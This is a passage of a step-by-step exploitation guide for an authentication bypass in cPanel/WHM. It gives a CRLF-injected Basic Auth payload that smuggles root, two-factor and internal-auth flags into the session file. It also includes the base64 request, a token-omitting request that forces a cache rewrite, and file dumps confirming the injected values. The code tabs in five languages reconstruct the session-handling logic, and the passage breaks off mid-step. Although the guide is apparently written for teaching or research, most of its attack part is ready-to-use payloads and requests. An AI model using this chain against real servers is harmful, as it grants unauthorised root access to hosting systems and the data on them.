{% tab title="Node JS" %}
```js
let auth_header = server_obj.request.get_headers()["authorization"];

if (!auth_header) {
    server_obj.badpass("preserve_token", 1, "noauth", 1);
} else {

    let parts = auth_header.split(/\s+/, 2);
    let authtype = parts[0];
    let encoded = parts[1];

    if (/^basic$/i.test(authtype)) {

        let decoded = Buffer.from(encoded, 'base64').toString();
        let creds = decoded.split(":", 2);

        let user = creds[0];
        let pass = creds[1];

        user = server_obj.auth.set_user(user);
        pass = server_obj.auth.set_pass(pass);

        if (SESSION_ref) {

            let safe_login = SESSION_ref.needs_auth ? 1 : 0;

            if (SESSION_ref.user !== undefined
                && SESSION_ref.pass !== undefined
                && SESSION_ref.user === user
                && SESSION_ref.pass === pass) {

                safe_login = 1;
            } else {
                SESSION_ref.needs_auth = 1;
            }

            if (SESSION_ref.needs_auth) {
                delete SESSION_ref.needs_auth;
                SESSION_ref.user = user;
                SESSION_ref.pass = pass;

                if (!Cpanel.Session.saveSession(session, SESSION_ref)) {
                    server_obj.badpass();
                }
            }
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Create a credential for Basic Auth

```
root:<payload>
```

Prepare the payload accordingly :

```bash
x\r\n
hasroot=1\r\n
tfa_verified=1\r\n
user=root\r\n
cp_security_token=/cpsess9999999999\r\n
successful_internal_auth_with_timestamp=1777462149
```
{% endstep %}

{% step %}
Encode the payload in Base64 and place it in the authentication header, then send the request. Check whether the response returns status code 302 or 307. If yes, authentication was successful

```http
GET / HTTP/1.1
Host: target:2087
Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_
Authorization: Basic cm9vdDp4DQpoYXNyb290PTENCnRmYV92ZXJpZmllZD0xDQp1c2VyPXJvb3QNCmNwX3Nl…
Connection: close
```
{% endstep %}

{% step %}
Read the session file stored on disk and check whether the credentials created by your payload are present

```bash
$ cat -A /var/cpanel/sessions/raw/:QSJN_sFdKZtCi2o_

tfa_verified=0$
ip_address=172.17.0.1$
user=root$
login_theme=cpanel$
port=43586$
origin_as_string=address=172.17.0.1,app=whostmgrd,method=badpass$
pass=x
hasroot=1
tfa_verified=1
user=root
cp_security_token=/cpsess9999999999
successful_internal_auth_with_timestamp=1777462149
hulk_registered=0$
local_port=2087$
cp_security_token=/cpsess0228251236$
external_validation_token=ss27XQjbY11gmCDs$
local_ip_address=172.17.0.2$
```
{% endstep %}

{% step %}
Send a request to internal APIs and observe the response. If you receive 200, authentication is successful. If you receive 403, check which function processes authenticated requests (for example page loads or API calls). Also check whether it reads the raw session file or a cached version

{% tabs %}
{% tab title="Perl" %}
```perl
sub loadSession {
    my ($session) = @_;
    ...
    my $session_file  = get_session_file_path($session); # /var/cpanel/sessions/raw/<id>
    my $session_cache = $Cpanel::Config::Session::SESSION_DIR . '/cache/' . $session;
    my $session_ref;

    # First try the binary cache. AdminBin::Serializer is JSON.
    if ( $session_cache_fh = _open_if_exists_or_warn($session_cache) ) {
        eval {
            local $SIG{__DIE__};
            $session_ref = Cpanel::AdminBin::Serializer::LoadFile($session_cache_fh);
            $mtime       = ( stat($session_cache_fh) )[9];
        };
    }

    # Only fall through to the slow text parse if the cache load failed or returned nothing.
    if ( !keys %$session_ref ) {
        if ( $session_fh = _open_if_exists_or_warn($session_file) ) {
            require Cpanel::Config::LoadConfig;
            $session_ref = Cpanel::Config::LoadConfig::parse_from_filehandle(
                $session_fh, delimiter => '='
            );
        }
    }
    ...
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
public Dictionary<string, object> LoadSession(string session)
{
    string session_file = GetSessionFilePath(session); // /var/cpanel/sessions/raw/<id>
    string session_cache = Cpanel.Config.Session.SESSION_DIR + "/cache/" + session;
    Dictionary<string, object> session_ref = null;

    FileStream session_cache_fh = null;

    // First try the binary cache. AdminBin::Serializer is JSON.
    if ((session_cache_fh = OpenIfExistsOrWarn(session_cache)) != null)
    {
        try
        {
            session_ref = Cpanel.AdminBin.Serializer.LoadFile(session_cache_fh);
            long mtime = session_cache_fh.LastWriteTimeUtc.Ticks;
        }
        catch
        {
            // ignore
        }
    }

    // Only fall through to the slow text parse if the cache load failed or returned nothing.
    if (session_ref == null || session_ref.Count == 0)
    {
        FileStream session_fh = OpenIfExistsOrWarn(session_file);

        if (session_fh != null)
        {
            session_ref = Cpanel.Config.LoadConfig.ParseFromFileHandle(
                session_fh,
                "="
            );
        }
    }

    return session_ref;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public Map<String, Object> loadSession(String session) {

    String session_file = getSessionFilePath(session); // /var/cpanel/sessions/raw/<id>
    String session_cache = Cpanel.Config.Session.SESSION_DIR + "/cache/" + session;
    Map<String, Object> session_ref = null;

    FileInputStream session_cache_fh = null;

    // First try the binary cache. AdminBin::Serializer is JSON.
    if ((session_cache_fh = openIfExistsOrWarn(session_cache)) != null) {
        try {
            session_ref = Cpanel.AdminBin.Serializer.loadFile(session_cache_fh);
            long mtime = session_cache_fh.getChannel().lastModifiedTime().toMillis();
        } catch (Exception e) {
            // ignore
        }
    }

    // Only fall through to the slow text parse if the cache load failed or returned nothing.
    if (session_ref == null || session_ref.isEmpty()) {

        FileInputStream session_fh = openIfExistsOrWarn(session_file);

        if (session_fh != null) {
            session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(
                session_fh,
                "="
            );
        }
    }

    return session_ref;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function loadSession($session)
{
    $session_file  = get_session_file_path($session); // /var/cpanel/sessions/raw/<id>
    $session_cache = Cpanel\Config\Session::SESSION_DIR . '/cache/' . $session;
    $session_ref = null;

    $session_cache_fh = null;

    // First try the binary cache. AdminBin::Serializer is JSON.
    if (($session_cache_fh = _open_if_exists_or_warn($session_cache))) {
        try {
            $session_ref = Cpanel_AdminBin_Serializer::LoadFile($session_cache_fh);
            $mtime = filemtime($session_cache);
        } catch (Exception $e) {
            // ignore
        }
    }

    // Only fall through to the slow text parse if the cache load failed or returned nothing.
    if (empty($session_ref)) {

        $session_fh = _open_if_exists_or_warn($session_file);

        if ($session_fh) {
            $session_ref = Cpanel_Config_LoadConfig::parse_from_filehandle(
                $session_fh,
                '='
            );
        }
    }

    return $session_ref;
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function loadSession(session) {

    let session_file = get_session_file_path(session); // /var/cpanel/sessions/raw/<id>
    let session_cache = Cpanel.Config.Session.SESSION_DIR + "/cache/" + session;
    let session_ref = null;

    let fs = require("fs");

    let session_cache_fh = null;

    // First try the binary cache. AdminBin::Serializer is JSON.
    if ((session_cache_fh = openIfExistsOrWarn(session_cache)) != null) {
        try {
            session_ref = Cpanel.AdminBin.Serializer.loadFile(session_cache_fh);
            let mtime = fs.statSync(session_cache).mtimeMs;
        } catch (e) {
            // ignore
        }
    }

    // Only fall through to the slow text parse if the cache load failed or returned nothing.
    if (!session_ref || Object.keys(session_ref).length === 0) {

        let session_fh = openIfExistsOrWarn(session_file);

        if (session_fh) {
            session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(
                session_fh,
                "="
            );
        }
    }

    return session_ref;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Analyze the structure of the generated cache file and its format (for example JSON)

```json
{
"tfa_verified":"0",
"ip_address":"172.17.0.1",
"user":"root",
"pass":"x\r\nhasroot=1\r\ntfa_verified=1\r\nuser=root\r\n...",
"cp_security_token":"/cpsess0228251236"
}    
```
{% endstep %}

{% step %}
In the codebase, find paths where the session is reprocessed from raw data and rewritten into the cache file (JSON or other format). These methods are usually part of session processing logic

{% tabs %}
{% tab title="Perl" %}
```perl
if ( !keys %$session_ref ) {
    $session_ref = Cpanel::Config::LoadConfig::parse_from_filehandle(...)
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
if (session_ref == null || session_ref.Count == 0)
{
    session_ref = Cpanel.Config.LoadConfig.ParseFromFileHandle(...);
}
```
{% endtab %}

{% tab title="Java" %}
```java
if (session_ref == null || session_ref.isEmpty()) {
    session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(...);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
if (empty($session_ref) || !count($session_ref)) {
    $session_ref = Cpanel_Config_LoadConfig::parse_from_filehandle(...);
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
if (!session_ref || Object.keys(session_ref).length === 0) {
    session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(...);
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Find where the function responsible for parsing files (such as `parse_from_filehandle`) is called. Go to its definition and check whether it can ignore the cache file (JSON format)

{% tabs %}
{% tab title="Perl" %}
```perl
sub new {
    my ( $class, $session, $check_expiration ) = @_;

    if ( $check_expiration ? !Cpanel::Session::Load::session_exists_and_is_current($session) : !Cpanel::Session::Load::session_exists($session) ) {
        die "The session  ^`^|$session ^`^} does not exist";
    }

    Cpanel::Session::Load::get_ob_part( \$session );    # strip ob_part

    my $session_file = Cpanel::Session::Load::get_session_file_path($session);

    # Cpanel::Transaction not available here due to memory constraints
    my ( $ref, $fh, $conflock ) = Cpanel::Config::LoadConfig::loadConfig( // (1)
        $session_file,
        undef,
        '=',
        undef,
        0,
        0,
        { 'skip_readable_check' => 1, 'nocache' => 1, 'keep_locked_open' => 1, 'rw' => 1 } // (2)
    );

    return bless {
        '_session' => $session,
        '_fh'      => $fh,
        '_lock'    => $conflock,
        '_data'    => Cpanel::Session::decode_origin($ref),
    }, $class;
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
public class SessionLoader
{
    public static SessionLoader New(string session, bool check_expiration)
    {
        if (check_expiration
            ? !Cpanel.Session.Load.SessionExistsAndIsCurrent(session)
            : !Cpanel.Session.Load.SessionExists(session))
        {
            throw new Exception("The session ^`^|" + session + " ^`^} does not exist");
        }

        Cpanel.Session.Load.GetObPart(ref session); // strip ob_part

        string session_file = Cpanel.Session.Load.GetSessionFilePath(session);

        // Cpanel::Transaction not available here due to memory constraints
        var result = Cpanel.Config.LoadConfig.LoadConfig(
            session_file,
            null,
            "=",
            null,
            0,
            0,
            new Dictionary<string, object>
            {
                { "skip_readable_check", 1 },
                { "nocache", 1 },
                { "keep_locked_open", 1 },
                { "rw", 1 }
            }
        );

        var refData = result.Item1;
        var fh = result.Item2;
        var conflock = result.Item3;

        return new SessionLoader
        {
            _session = session,
            _fh = fh,
            _lock = conflock,
            _data = Cpanel.Session.DecodeOrigin(refData)
        };
    }

    private string _session;
    private object _fh;
    private object _lock;
    private object _data;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class SessionLoader {

    public static SessionLoader newInstance(String session, boolean check_expiration) throws Exception {

        if (check_expiration
                ? !Cpanel.Session.Load.sessionExistsAndIsCurrent(session)
                : !Cpanel.Session.Load.sessionExists(session)) {

            throw new Exception("The session ^`^|" + session + " ^`^} does not exist");
        }

        Cpanel.Session.Load.getObPart(session); // strip ob_part

        String session_file = Cpanel.Session.Load.getSessionFilePath(session);

        // Cpanel::Transaction not available here due to memory constraints
        LoadConfigResult result = Cpanel.Config.LoadConfig.loadConfig(
                session_file,
                null,
                "=",
                null,
                0,
                0,
                new HashMap<String, Object>() {{
                    put("skip_readable_check", 1);
                    put("nocache", 1);
                    put("keep_locked_open", 1);
                    put("rw", 1);
                }}
        );

        Map<String, Object> refData = result.getRef();
        FileInputStream fh = result.getFh();
        Object conflock = result.getLock();

        return new SessionLoader(
                session,
                fh,
                conflock,
                Cpanel.Session.decodeOrigin(refData)
        );
    }

    private String session;
    private Object fh;
    private Object lock;
    private Object data;

    public SessionLoader(String session, Object fh, Object lock, Object data) {
        this.session = session;
        this.fh = fh;
        this.lock = lock;
        this.data = data;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SessionLoader {

    public static function new($class, $session, $check_expiration)
    {
        if ($check_expiration
            ? !Cpanel_Session_Load::session_exists_and_is_current($session)
            : !Cpanel_Session_Load::session_exists($session)) {

            die("The session  ^`^|$session ^`^} does not exist");
        }

        Cpanel_Session_Load::get_ob_part($session);

        $session_file = Cpanel_Session_Load::get_session_file_path($session);

        // Cpanel::Transaction not available here due to memory constraints
        list($ref, $fh, $conflock) = Cpanel_Config_LoadConfig::loadConfig(
            $session_file,
            null,
            '=',
            null,
            0,
            0,
            [
                'skip_readable_check' => 1,
                'nocache' => 1,
                'keep_locked_open' => 1,
                'rw' => 1
            ]
        );

        return [
            '_session' => $session,
            '_fh'      => $fh,
            '_lock'    => $conflock,
            '_data'    => Cpanel_Session::decode_origin($ref),
        ];
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
class SessionLoader {

    static new(session, check_expiration) {

        if (check_expiration
            ? !Cpanel.Session.Load.sessionExistsAndIsCurrent(session)
            : !Cpanel.Session.Load.sessionExists(session)) {

            throw new Error("The session ^`^|" + session + " ^`^} does not exist");
        }

        Cpanel.Session.Load.getObPart(session);

        let session_file = Cpanel.Session.Load.getSessionFilePath(session);

        // Cpanel::Transaction not available here due to memory constraints
        let result = Cpanel.Config.LoadConfig.loadConfig(
            session_file,
            null,
            "=",
            null,
            0,
            0,
            {
                skip_readable_check: 1,
                nocache: 1,
                keep_locked_open: 1,
                rw: 1
            }
        );

        return new SessionLoader(
            session,
            result.fh,
            result.conflock,
            Cpanel.Session.decodeOrigin(result.ref)
        );
    }

    constructor(session, fh, lock, data) {
        this._session = session;
        this._fh = fh;
        this._lock = lock;
        this._data = data;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then find the function that rewrites the cache file from the raw session file after ignoring the cache (for example, `write_session` handles updating the cache file)

{% tabs %}
{% tab title="Perl" %}
```perl
sub save {
    my ($self) = @_;
    Cpanel::Session::filter_sessiondata( $self->{_data} );
    Cpanel::Session::encode_origin( $self->{_data} );
    Cpanel::Session::write_session( $self->{_session}, $self->{_fh}, $self->{_data} )
        or die "Failed to write the session file: $!";
    return $self->_close_session();
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
public bool Save()
{
    Cpanel.Session.FilterSessionData(this._data);
    Cpanel.Session.EncodeOrigin(this._data);

    if (!Cpanel.Session.WriteSession(this._session, this._fh, this._data))
    {
        throw new Exception("Failed to write the session file: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
    }

    return this.CloseSession();
}
```
{% endtab %}

{% tab title="Java" %}
```java
public boolean save() throws Exception {

    Cpanel.Session.filterSessiondata(this._data);
    Cpanel.Session.encodeOrigin(this._data);

    boolean result = Cpanel.Session.writeSession(this._session, this._fh, this._data);

    if (!result) {
        throw new Exception("Failed to write the session file");
    }

    return this.closeSession();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function save()
{
    Cpanel_Session::filter_sessiondata($this->_data);
    Cpanel_Session::encode_origin($this->_data);

    if (!Cpanel_Session::write_session($this->_session, $this->_fh, $this->_data)) {
        die("Failed to write the session file: " . error_get_last()['message']);
    }

    return $this->_close_session();
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
save() {

    Cpanel.Session.filterSessiondata(this._data);
    Cpanel.Session.encodeOrigin(this._data);

    let result = Cpanel.Session.writeSession(this._session, this._fh, this._data);

    if (!result) {
        throw new Error("Failed to write the session file");
    }

    return this._close_session();
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the method responsible for rewriting and updating the cache

{% tabs %}
{% tab title="Perl" %}
```perl
sub write_session {
      my ($session, $session_fh, $session_ref) = @_;

      # Step 1: write the session raw text file, "key=value\n" per record.
      my $flush_result = Cpanel::Config::FlushConfig::flushConfig(
          $session_fh, $session_ref, '=', undef, { 'perms' => 0600 },
      );
      return $flush_result unless $flush_result;

      # Step 2: maintain a tiny "preauth" flag-file alongside the session.
      if ($session_ref->{'needs_auth'}) {
          unless (-e $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session) {
              if (open my $preauth_fh, '>',
                  $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session)
              {
                  print $preauth_fh $main::now || time;
                  close $preauth_fh;
              }
          }
      }
      elsif (-e $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session) {
          unlink $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session;
      }

      # Step 3: write the binary (JSON) cache file with the same hash content.
      Cpanel::FileUtils::Write::overwrite(
          $Cpanel::Config::Session::SESSION_DIR . '/cache/' . $session,
          Cpanel::AdminBin::Serializer::Dump($session_ref),
          0600,
      );

      return 1;
  }
```
{% endtab %}

{% tab title="C#" %}
```csharp
public bool WriteSession(string session, FileStream session_fh, Dictionary<string, object> session_ref)
{
    // Step 1: write the session raw text file, "key=value\n" per record.
    bool flush_result = Cpanel.Config.FlushConfig.FlushConfig(
        session_fh,
        session_ref,
        "=",
        null,
        new Dictionary<string, object> { { "perms", "0600" } }
    );

    if (!flush_result)
        return false;

    string baseDir = Cpanel.Config.Session.SESSION_DIR;

    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
    if (session_ref.ContainsKey("needs_auth") && session_ref["needs_auth"] != null)
    {
        string preauthPath = baseDir + "/preauth/" + session;

        if (!File.Exists(preauthPath))
        {
            File.WriteAllText(preauthPath, DateTimeOffset.Now.ToUnixTimeSeconds().ToString());
        }
    }
    else
    {
        string preauthPath = baseDir + "/preauth/" + session;

        if (File.Exists(preauthPath))
        {
            File.Delete(preauthPath);
        }
    }

    // Step 3: write the binary (JSON) cache file with the same hash content.
    string cachePath = baseDir + "/cache/" + session;

    File.WriteAllText(
        cachePath,
        Cpanel.AdminBin.Serializer.Dump(session_ref)
    );

    return true;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public boolean writeSession(String session, FileOutputStream session_fh, Map<String, Object> session_ref) {

    // Step 1: write the session raw text file, "key=value\n" per record.
    boolean flush_result = Cpanel.Config.FlushConfig.flushConfig(
            session_fh,
            session_ref,
            "=",
            null,
            new HashMap<String, Object>() {{
                put("perms", "0600");
            }}
    );

    if (!flush_result)
        return false;

    String baseDir = Cpanel.Config.Session.SESSION_DIR;

    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
    if (session_ref.containsKey("needs_auth") && session_ref.get("needs_auth") != null) {

        String preauthPath = baseDir + "/preauth/" + session;

        File f = new File(preauthPath);
        if (!f.exists()) {
            try (FileWriter fw = new FileWriter(f)) {
                fw.write(String.valueOf(System.currentTimeMillis()));
            }
        }

    } else {

        String preauthPath = baseDir + "/preauth/" + session;
        File f = new File(preauthPath);

        if (f.exists()) {
            f.delete();
        }
    }

    // Step 3: write the binary (JSON) cache file with the same hash content.
    String cachePath = baseDir + "/cache/" + session;

    try (FileWriter fw = new FileWriter(cachePath)) {
        fw.write(Cpanel.AdminBin.Serializer.dump(session_ref));
    } catch (Exception e) {
        throw new RuntimeException(e);
    }

    return true;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function write_session($session, $session_fh, $session_ref)
{
    // Step 1: write the session raw text file, "key=value\n" per record.
    $flush_result = Cpanel_Config_FlushConfig::flushConfig(
        $session_fh,
        $session_ref,
        '=',
        null,
        ['perms' => '0600']
    );

    if (!$flush_result) {
        return false;
    }

    $baseDir = Cpanel_Config_Session::SESSION_DIR;

    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
    if (!empty($session_ref['needs_auth'])) {

        $preauthPath = $baseDir . '/preauth/' . $session;

        if (!file_exists($preauthPath)) {
            file_put_contents($preauthPath, time());
        }

    } else {

        $preauthPath = $baseDir . '/preauth/' . $session;

        if (file_exists($preauthPath)) {
            unlink($preauthPath);
        }
    }

    // Step 3: write the binary (JSON) cache file with the same hash content.
    $cachePath = $baseDir . '/cache/' . $session;

    file_put_contents(
        $cachePath,
        Cpanel_AdminBin_Serializer::Dump($session_ref)
    );

    return true;
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function writeSession(session, session_fh, session_ref) {

    // Step 1: write the session raw text file, "key=value\n" per record.
    let flush_result = Cpanel.Config.FlushConfig.flushConfig(
        session_fh,
        session_ref,
        "=",
        null,
        { perms: "0600" }
    );

    if (!flush_result)
        return false;

    const fs = require("fs");
    let baseDir = Cpanel.Config.Session.SESSION_DIR;

    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
    if (session_ref.needs_auth) {

        let preauthPath = baseDir + "/preauth/" + session;

        if (!fs.existsSync(preauthPath)) {
            fs.writeFileSync(preauthPath, Date.now().toString());
        }

    } else {

        let preauthPath = baseDir + "/preauth/" + session;

        if (fs.existsSync(preauthPath)) {
            fs.unlinkSync(preauthPath);
        }
    }

    // Step 3: write the binary (JSON) cache file with the same hash content.
    let cachePath = baseDir + "/cache/" + session;

    fs.writeFileSync(
        cachePath,
        Cpanel.AdminBin.Serializer.Dump(session_ref)
    );

    return true;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Find methods like `new` (which ignores the cache and rebuilds it from raw data) and `save` (which stores the updated session). Check under what conditions these methods can be triggered so that your manipulated raw file is used to overwrite the cache file

{% tabs %}
{% tab title="Perl" %}
```perl
sub do_token_denied {
    my ($error_msg, $form_ref, $goto_uri, $use_theme) = @_;
    ...
    my $max_tries = 3;
    if ($user_provided_session_ref = $server_obj->get_current_session_ref_if_exists) {
        my $session = $server_obj->get_current_session;
        if (not $server_obj->request->get_supplied_security_token
            or ++$user_provided_session_ref->{'token_denied'} < $max_tries)
        {
            require Cpanel::Session::Modify;
            my $session_mod = 'Cpanel::Session::Modify'->new($session);     # (1)
            $session_mod->set('token_denied',
                defined $session_mod->get('token_denied')
                ? $session_mod->get('token_denied') + 1
                : 1
            );
            $session_mod->save;                                             # (2)
            $another_try = 1;
        }
    }
    ...
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
public void DoTokenDenied(string error_msg, Dictionary<string, object> form_ref, string goto_uri, bool use_theme)
{
    int max_tries = 3;

    var user_provided_session_ref = server_obj.get_current_session_ref_if_exists();

    if (user_provided_session_ref != null)
    {
        string session = server_obj.get_current_session();

        if (server_obj.request.get_supplied_security_token() == null
            || (Convert.ToInt32(user_provided_session_ref["token_denied"]) + 1) < max_tries)
        {
            var session_mod = new Cpanel.Session.Modify(session);

            int current = user_provided_session_ref.ContainsKey("token_denied")
                ? Convert.ToInt32(user_provided_session_ref["token_denied"])
                : 0;

            session_mod.set("token_denied", current + 1);
            session_mod.save();

            bool another_try = true;
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void doTokenDenied(String error_msg, Map<String, Object> form_ref, String goto_uri, boolean use_theme) {

    int max_tries = 3;

    Map<String, Object> user_provided_session_ref =
            server_obj.getCurrentSessionRefIfExists();

    if (user_provided_session_ref != null) {

        String session = server_obj.getCurrentSession();

        if (server_obj.getRequest().getSuppliedSecurityToken() == null
                || ((Integer) user_provided_session_ref.getOrDefault("token_denied", 0)) + 1 < max_tries) {

            Cpanel.Session.Modify session_mod = new Cpanel.Session.Modify(session);

            int current = (Integer) user_provided_session_ref.getOrDefault("token_denied", 0);

            session_mod.set("token_denied", current + 1);
            session_mod.save();

            boolean another_try = true;
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function do_token_denied($error_msg, $form_ref, $goto_uri, $use_theme)
{
    $max_tries = 3;

    $user_provided_session_ref = $server_obj->get_current_session_ref_if_exists();

    if ($user_provided_session_ref) {

        $session = $server_obj->get_current_session();

        if (
            !$server_obj->request->get_supplied_security_token()
            || ++$user_provided_session_ref['token_denied'] < $max_tries
        ) {

            $session_mod = new Cpanel_Session_Modify($session);

            $current = isset($user_provided_session_ref['token_denied'])
                ? $user_provided_session_ref['token_denied']
                : 0;

            $session_mod->set('token_denied', $current + 1);
            $session_mod->save();

            $another_try = true;
        }
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function doTokenDenied(error_msg, form_ref, goto_uri, use_theme) {

    let max_tries = 3;

    let user_provided_session_ref =
        server_obj.get_current_session_ref_if_exists();

    if (user_provided_session_ref) {

        let session = server_obj.get_current_session();

        if (
            !server_obj.request.get_supplied_security_token()
            || ((user_provided_session_ref.token_denied || 0) + 1) < max_tries
        ) {

            let session_mod = new Cpanel.Session.Modify(session);

            let current = user_provided_session_ref.token_denied || 0;

            session_mod.set("token_denied", current + 1);
            session_mod.save();

            let another_try = true;
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Find where these methods (`new`, `save`) are called in the codebase and determine under what conditions that function is executed

{% tabs %}
{% tab title="Perl" %}
```perl
sub check_security_token {
    ...
    if (not $server_obj->request->get_supplied_security_token) {
        $failmsg = 'security token missing';
    }
    elsif ($ENV{'cp_security_token'} ne $server_obj->request->get_supplied_security_token)  { // (1)
        $failmsg = 'security token incorrect';
    }
    if ($failmsg) {
        ...
        do_token_denied($failmsg);                       # (2)
    }
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
public void CheckSecurityToken()
{
    string failmsg = null;

    if (server_obj.request.get_supplied_security_token() == null)
    {
        failmsg = "security token missing";
    }
    else if (Environment.GetEnvironmentVariable("cp_security_token")
             != server_obj.request.get_supplied_security_token())
    {
        failmsg = "security token incorrect";
    }

    if (failmsg != null)
    {
        DoTokenDenied(failmsg, null, null, false);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void checkSecurityToken() {

    String failmsg = null;

    if (server_obj.getRequest().getSuppliedSecurityToken() == null) {
        failmsg = "security token missing";
    }
    else if (!System.getenv("cp_security_token")
            .equals(server_obj.getRequest().getSuppliedSecurityToken())) {
        failmsg = "security token incorrect";
    }

    if (failmsg != null) {
        doTokenDenied(failmsg, null, null, false);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function check_security_token()
{
    $failmsg = null;

    if (!$server_obj->request->get_supplied_security_token()) {
        $failmsg = "security token missing";
    }
    elseif ($_ENV['cp_security_token'] != $server_obj->request->get_supplied_security_token()) {
        $failmsg = "security token incorrect";
    }

    if ($failmsg) {
        do_token_denied($failmsg);
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
function checkSecurityToken() {

    let failmsg = null;

    if (!server_obj.request.get_supplied_security_token()) {
        failmsg = "security token missing";
    }
    else if (process.env.cp_security_token
        !== server_obj.request.get_supplied_security_token()) {
        failmsg = "security token incorrect";
    }

    if (failmsg) {
        doTokenDenied(failmsg);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check how this function is triggered (for example, through URLs with a security token—removing the token may trigger the cache rewrite process)

```bash
/cpsess1234567890/scripts2/listaccts
```

Send a request without the security token

```http
GET /scripts2/listaccts HTTP/1.1
Host: target:2087
Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_
Connection: close
```

Observe the response

```http
HTTP/1.1 401 Token Denied
Cache-Control: no-cache, no-store, must-revalidate, private
Content-Type: text/html; charset="utf-8"
```
{% endstep %}

{% step %}
Check whether your raw session file has now been used to overwrite the cache file and is usable

```json
{
"tfa_verified":"1",                                      <-- was 0, now 1 — injection won
"user":"root",
"hasroot":"1",                                           <-- TOP-LEVEL now
"successful_internal_auth_with_timestamp":"1777462149",  <-- TOP-LEVEL now
"cp_security_token":"/cpsess0228251236",
"external_validation_token":"ss27XQjbY11gmCDs",
"token_denied":"1",
"pass":"x",                                              <-- stripped to just "x"
"ip_address":"172.17.0.1",
"local_ip_address":"172.17.0.2",
...
}
```
{% endstep %}

{% step %}
Send a request to internal APIs again. If the response is 200, authentication bypass is successful. If it is 403, look for functions executed after authentication (for example post-auth checks)

{% tabs %}
{% tab title="Perl" %}
```perl
handle_form_login();
…
handle_auth();

my $authtype   = $server_obj->auth->get_auth_type || '';
my $document   = $server_obj->request->get_document;
$user          = $server_obj->auth->get_user;
my $pass       = $server_obj->auth->get_pass;
…
if ($Cpanel::App::appname eq 'whostmgrd') {
    …
    docheckpass_whostmgrd(
        'user' => $user,
        'pass' => $pass,
        …
    );
    …
}
```
{% endtab %}

{% tab title="C#" %}
```csharp
handle_form_login();
// …
handle_auth();

string authtype = server_obj.auth.get_auth_type() ?? "";
string document = server_obj.request.get_document();
string user = server_obj.auth.get_user();
string pass = server_obj.auth.get_pass();
// …

if (Cpanel.App.appname == "whostmgrd")
{
    // …

    docheckpass_whostmgrd(new Dictionary<string, object>
    {
        { "user", user },
        { "pass", pass }
        // …
    });

    // …
}
```
{% endtab %}

{% tab title="Java" %}
```java
handle_form_login();
// …
handle_auth();

String authtype = server_obj.auth.get_auth_type();
if (authtype == null) authtype = "";

String document = server_obj.request.get_document();
String user = server_obj.auth.get_user();
String pass = server_obj.auth.get_pass();
// …

if ("whostmgrd".equals(Cpanel.App.appname)) {

    // …

    Map<String, Object> opts = new HashMap<>();
    opts.put("user", user);
    opts.put("pass", pass);
    // …

    docheckpass_whostmgrd(opts);

    // …
}
```
{% endtab %}

{% tab title="PHP" %}
```php
handle_form_login();
// …
handle_auth();

$authtype = $server_obj->auth->get_auth_type() ?: '';
$document = $server_obj->request->get_document();
$user     = $server_obj->auth->get_user();
$pass     = $server_obj->auth->get_pass();
// …

if ($Cpanel_App_appname === 'whostmgrd') {

    // …

    docheckpass_whostmgrd([
        'user' => $user,
        'pass' => $pass,
        // …
    ]);

    // …
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
handle_form_login();
// …
handle_auth();

let authtype = server_obj.auth.get_auth_type() || "";
let document = server_obj.request.get_document();
let user = server_obj.auth.get_user();
let pass = server_obj.auth.get_pass();
// …

if (Cpanel.App.appname === "whostmgrd") {

    // …

    docheckpass_whostmgrd({
        user: user,
        pass: pass,
        // …
    });

    // …
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether there are conditions where security checks are skipped (for example when flags like `$successful_external_auth_with_timestamp` or `$successful_internal_auth_with_timestamp` are true)

{% tabs %}
{% tab title="Perl" %}
```perl
if ($successful_external_auth_with_timestamp or $successful_internal_auth_with_timestamp) {
    $authorized = _check_external_internal_auth_from_docheckpass(%OPTS);
}
...
